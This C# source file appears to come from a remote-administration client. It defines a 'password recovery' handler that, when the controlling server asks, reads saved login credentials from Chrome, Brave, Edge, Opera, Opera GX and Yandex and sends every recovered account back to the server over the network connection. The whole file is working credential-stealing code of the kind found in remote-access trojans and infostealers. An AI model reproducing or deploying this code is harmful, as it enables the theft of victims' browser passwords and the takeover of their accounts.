using RemoteAdmin.Shared;
using System;
using System.Collections.Generic;
using System.Net.Security;
using System.Threading.Tasks;

namespace RemoteAdmin.Client.Handlers
{
    public class PasswordRecoveryHandler
    {
        public static async Task HandlePasswordRecoveryRequest(SslStream stream)
        {
            Console.WriteLine("Starting password recovery...");

            var allAccounts = new List<RecoveredAccount>();
            var browsers = new List<Recovery.Browsers.ChromiumBase>
            {
                new Recovery.Browsers.ChromePassReader(),
                new Recovery.Browsers.BravePassReader(),
                new Recovery.Browsers.EdgePassReader(),
                new Recovery.Browsers.OperaPassReader(),
                new Recovery.Browsers.OperaGXPassReader(),
                new Recovery.Browsers.YandexPassReader()
            };

            foreach (var browser in browsers)
            {
                try
                {
                    Console.WriteLine($"Recovering passwords from {browser.ApplicationName}...");
                    var accounts = browser.ReadAccounts();

                    if (accounts != null && accounts.Count > 0)
                    {
                        allAccounts.AddRange(accounts);
                        Console.WriteLine($"Successfully recovered {accounts.Count} passwords from {browser.ApplicationName}");
                    }
                    else
                    {
                        Console.WriteLine($"No passwords found in {browser.ApplicationName}");
                    }
                }
                catch (Exception ex)
                {
                    Console.WriteLine($"Error reading accounts from {browser.ApplicationName}: {ex.Message}");
                    // Continue with next browser even if one fails
                }
            }

            Console.WriteLine($"Password recovery completed. Found {allAccounts.Count} accounts total.");

            // Send response back to server
            var response = new PasswordRecoveryResponseMessage
            {
                Success = true,
                Accounts = allAccounts
            };

            try
            {
                await NetworkHelper.SendMessageAsync(stream, response);
                Console.WriteLine("Password recovery response sent to server");
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Failed to send password recovery response: {ex.Message}");
            }
        }
    }
}
